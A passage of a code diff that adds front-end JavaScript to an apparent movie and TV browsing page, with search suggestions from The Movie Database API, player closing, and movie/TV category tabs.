+            suggestionsBox.style.display = 'none';
+            return;
+        }
+        try {
+            const endpoint = `https://api.themoviedb.org/3/search/${currentMediaType === 'movie' ? 'movie' : 'tv'}?query=${encodeURIComponent(query)}&page=1`;
+            const data = await tmdbFetch(endpoint);
+            const items = data.results.slice(0, 6);
+            if (!items.length) {
+                suggestionsBox.style.display = 'none';
+                return;
+            }
+            suggestionsBox.innerHTML = '';
+            items.forEach(item => {
+                const poster = item.poster_path ? `https://image.tmdb.org/t/p/w92${item.poster_path}` : '';
+                const title = currentMediaType === 'movie' ? item.title : item.name;
+                const year = currentMediaType === 'movie' 
+                    ? (item.release_date ? item.release_date.split('-')[0] : '')
+                    : (item.first_air_date ? item.first_air_date.split('-')[0] : '');
+                const div = document.createElement('div');
+                div.className = 'suggestion-item';
+                div.innerHTML = `
+                    ${poster ? `<img class="suggestion-poster" src="${poster}" alt="">` : '<div class="suggestion-poster" style="background:#444;"></div>'}
+                    <div class="suggestion-info">
+                        <div class="suggestion-title">${title}</div>
+                        <div class="suggestion-year">${year} ⭐ ${item.vote_average?.toFixed(1) || '?'}</div>
+                    </div>
+                `;
+                div.onclick = () => {
+                    searchInput.value = title;
+                    suggestionsBox.style.display = 'none';
+                    executeSearch();
+                };
+                suggestionsBox.appendChild(div);
+            });
+            suggestionsBox.style.display = 'block';
+        } catch(e) {
+            suggestionsBox.style.display = 'none';
+        }
+    }
+
+    function closePlayer() {
+        playerSection.style.display = 'none';
+        moviesContainer.style.display = 'block';
+        videoWrapper.innerHTML = '';
+        playerTitleSpan.innerHTML = '';
+        episodeSelectorDiv.innerHTML = '';
+        loadContent(currentMediaType, currentCategory);
+    }
+
+    // Event listeners
+    searchInput.addEventListener('input', (e) => {
+        if (searchTimeout) clearTimeout(searchTimeout);
+        const val = e.target.value;
+        searchTimeout = setTimeout(() => fetchSuggestions(val), 300);
+    });
+    document.addEventListener('click', (e) => {
+        if (!searchInput.contains(e.target) && !suggestionsBox.contains(e.target)) {
+            suggestionsBox.style.display = 'none';
+        }
+    });
+    searchBtn.addEventListener('click', () => {
+        suggestionsBox.style.display = 'none';
+        executeSearch();
+    });
+    searchInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            suggestionsBox.style.display = 'none';
+            executeSearch();
+        }
+    });
+
+    // Media type switcher
+    mediaTypeRadios.forEach(radio => {
+        radio.addEventListener('change', (e) => {
+            if (e.target.checked) {
+                currentMediaType = e.target.value;
+                // Update tabs for TV vs Movie
+                if (currentMediaType === 'tv') {
+                    tabsContainer.innerHTML = `
+                        <div class="tab active" data-category="trending">🔥 Trending TV</div>
+                        <div class="tab" data-category="popular">⭐ Popular TV</div>
+                        <div class="tab" data-category="top_rated">🏆 Top Rated TV</div>
+                    `;
+                } else {
+                    tabsContainer.innerHTML = `
+                        <div class="tab active" data-category="trending">🔥 Trending Movies</div>
+                        <div class="tab" data-category="popular">⭐ Popular Movies</div>
+                        <div class="tab" data-category="top_rated">🏆 Top Rated Movies</div>
+                    `;
+                }
+                // Re-attach tab event listeners
+                attachTabEvents();
+                currentCategory = "trending";
+                loadContent(currentMediaType, currentCategory);
+            }
+        });
+    });
+
+    function attachTabEvents() {
+        const tabs = document.querySelectorAll('.tab');
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                currentCategory = tab.getAttribute('data-category');
+                if (playerSection.style.display === 'block') {
+                    closePlayer();
+                } else {
+                    moviesContainer.style.display = 'block';
+                }
+                loadContent(currentMediaType, currentCategory);
             });
         });
-    </script>
+    }
+
+    closePlayerBtn.addEventListener('click', closePlayer);
+    attachTabEvents();
+
+    // Initial load
+    loadContent('movie', 'trending');
+</script>
 </body>
 </html>
